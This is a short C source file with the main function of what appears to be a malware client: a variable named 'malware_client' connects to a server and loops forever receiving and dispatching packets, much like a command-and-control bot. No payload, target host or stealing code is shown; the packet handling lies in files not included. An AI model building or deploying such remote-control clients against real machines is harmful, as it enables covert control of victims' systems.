#include "client.h"

int main(int argc, char ** argv) {

    system("clear");

    signal(SIGTSTP, shutdown_client);
    signal(SIGINT, shutdown_client);
    signal(SIGQUIT, shutdown_client);

    client * malware_client = malloc(sizeof(client));
    int id = client_connect_to_server(malware_client, NULL);
    malware_client->id = id;

    printf("Connected successfully to server. ID = %d\n", malware_client->id);

    while (1) {
        packet * packet_received = connection_read_packet(&malware_client->connection);
        client_on_packet_received(malware_client, packet_received);
    }
    
    return 0;

    //client_listento server     client_connect_to_server
}